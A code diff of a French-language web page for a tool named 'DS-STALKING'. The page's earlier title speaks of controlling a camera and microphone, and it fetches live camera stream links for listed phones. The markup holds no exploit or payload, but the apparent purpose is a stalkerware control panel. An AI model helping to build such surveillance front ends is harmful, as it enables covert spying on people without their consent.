@@ -1,42 +1,44 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contrôlez la Caméra et le Micro</title>
+    <title>Page d'accueil</title>
+    <style>
+        /* Appliquer un fond noir à la page entière */
+        body {
+            background-color: black;
+            color: white; /* Texte en blanc pour contraster avec le fond noir */
+            font-family: Arial, sans-serif;
+            text-align: center; /* Centrer le texte */
+            padding: 20px;
+        }
+        h1 {
+            font-size: 2em;
+        }
+        p {
+            font-size: 1.2em;
+        }
+    </style>
 </head>
 <body>
-    <h1>Bienvenue dans DS-STALKING</h1>
-    <p>Cliquez sur l'image du téléphone pour obtenir un lien de streaming en direct.</p>
+    <h1>Bienvenue sur DS-STALKING!</h1>
+    <p>Cliquez sur le lien ci-dessous pour commencer à voir le flux de la caméra.</p>
 
-    <div id="phones">
-        <img src="phone1.jpg" alt="Phone 1" class="phone-image" data-phone-id="1">
-        <img src="phone2.jpg" alt="Phone 2" class="phone-image" data-phone-id="2">
-        <img src="phone3.jpg" alt="Phone 3" class="phone-image" data-phone-id="3">
-        <!-- Ajoutez plus d'images si nécessaire -->
-    </div>
-
-    <p id="streamLink"></p>
+    <a href="/get_stream_link" style="color: #4CAF50; font-size: 1.5em; text-decoration: none;">Obtenez le lien du flux</a>
 
     <script>
-        // Quand une image est cliquée, un lien de streaming est généré
-        document.querySelectorAll('.phone-image').forEach(function(img) {
-            img.addEventListener('click', function() {
-                var phoneId = img.getAttribute('data-phone-id');
-
-                fetch(`/get_stream_link/${phoneId}`, {
-                    method: 'POST',  // Requête POST pour obtenir le lien
-                })
-                .then(response => response.json())
-                .then(data => {
-                    // Afficher le lien de streaming dans le HTML
-                    document.getElementById('streamLink').textContent = 'Lien de streaming : ' + data.stream_url;
-                })
-                .catch(error => {
-                    console.error('Erreur:', error);
-                });
-            });
-        });
+        // Cette fonction peut être ajoutée pour gérer le lien de streaming si nécessaire.
+        function getStreamLink() {
+            fetch("/get_stream_link", {
+                method: "POST"
+            })
+            .then(response => response.json())
+            .then(data => {
+                window.location.href = data.stream_url;  // Rediriger vers l'URL du stream
+            })
+            .catch(error => console.error("Erreur:", error));
+        }
     </script>
 </body>
 </html>
